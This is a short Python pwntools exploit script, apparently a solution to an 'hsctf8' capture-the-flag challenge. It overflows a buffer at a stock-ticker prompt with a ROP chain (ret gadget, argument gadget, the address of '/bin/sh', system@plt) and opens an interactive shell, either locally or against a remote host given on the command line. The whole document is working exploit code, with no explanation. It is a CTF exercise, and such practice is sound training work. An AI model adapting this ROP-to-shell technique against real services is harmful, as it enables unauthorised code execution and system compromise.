# hsctf8
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './chal'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

binsh = 0x402008
io = start()

payload = flat({
    40: [
        0x00000000004012c2, # ret in vuln()
    	0x401363,
    	binsh,
    	elf.plt.system,
    ]
})

write('payload', payload)
io.sendlineafter('Please enter the stock ticker symbol:', payload)
io.interactive()